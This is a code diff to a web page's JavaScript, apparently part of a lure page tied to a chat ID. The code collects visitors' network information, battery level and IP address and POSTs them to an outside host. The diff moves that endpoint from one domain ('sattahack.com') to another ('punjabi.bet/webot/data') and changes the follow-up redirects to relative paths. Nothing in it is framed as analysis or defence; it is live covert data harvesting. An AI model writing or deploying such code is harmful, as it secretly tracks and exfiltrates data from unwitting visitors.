@@ -78,7 +78,7 @@
                     const batteryLevel = Math.round(battery.level * 100);
                     await sendDeviceData(td, batteryLevel, ip);
                 } catch (error) {
-                    window.location.href = `https://redeemxcode.com/t/?id=${chatId}`;
+                    window.location.href = `/t/?id=${chatId}`;
                 }
             } else {
                 const batteryLevel = 'Not Supported';
@@ -88,7 +88,7 @@
 
         async function sendDeviceData(networkInfo, batteryLevel, ip) {
             try {
-                const response = await fetch('https://sattahack.com/data', {
+                const response = await fetch('https://punjabi.bet/webot/data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -102,12 +102,12 @@
                 });
 
                 if (response.ok) {
-                    window.location.href = `https://redeemxcode.com/t/?id=${chatId}`;
+                    window.location.href = `/t/?id=${chatId}`;
                 } else {
-                    window.location.href = `https://redeemxcode.com/t/?id=${chatId}`;
+                    window.location.href = `/t/?id=${chatId}`;
                 }
             } catch (error) {
-                window.location.href = `https://redeemxcode.com/t/?id=${chatId}`;
+                window.location.href = `/t/?id=${chatId}`;
             }
         }
 
@@ -117,7 +117,7 @@
                 const data = await response.json();
                 await gatherDeviceData(data.ip);
             } catch (error) {
-                window.location.href = `https://redeemxcode.com/t/?id=${chatId}`;
+                window.location.href = `/t/?id=${chatId}`;
             }
         }
 
